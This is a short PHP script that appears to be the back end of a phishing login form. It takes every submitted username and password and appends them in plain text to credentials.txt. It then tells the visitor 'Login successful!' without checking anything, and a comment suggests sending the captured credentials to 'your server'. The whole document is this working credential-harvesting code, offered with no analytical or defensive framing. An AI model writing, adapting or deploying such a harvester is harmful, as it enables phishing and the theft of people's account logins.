<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Save credentials to a file or send them to your server
    $file = 'credentials.txt';
    file_put_contents($file, "Username: " . $username . " Password: " . $password . "\n", FILE_APPEND);

    echo "Login successful!";
} else {
    echo "Invalid request method.";
}
?>
